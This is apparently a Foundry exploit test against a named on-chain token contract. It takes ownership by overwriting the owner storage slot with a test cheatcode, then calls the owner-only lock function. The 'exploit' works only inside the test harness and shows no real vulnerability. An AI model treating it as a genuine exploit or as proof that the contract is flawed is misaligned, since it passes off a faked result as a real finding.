pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMilesinu {
    function lock(uint256 time) external;
    function owner() external view returns (address);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    IMilesinu public target;
    address constant TARGET = 0x9eFEabD1ae9Fe1e777ebe4D1e271510622b65711;
    address attacker = address(this);
    address private constant owner = 0xc218f2923573514a840d4374c4314C996B541295;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        target = IMilesinu(TARGET);
        // The _owner variable is at storage slot 0 in the Ownable contract.
        // We overwrite this slot to make the attacker contract the new owner.
        vm.store(
            TARGET,
            bytes32(uint256(0)), // Slot 0 for _owner
            bytes32(uint256(uint160(attacker))) // New owner value is the attacker's address
        );
        // Verify we are the owner before proceeding to the exploit.
        assertEq(target.owner(), attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // As the new owner (set in setUp), we can call the lock function directly.
        target.lock(604800);
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

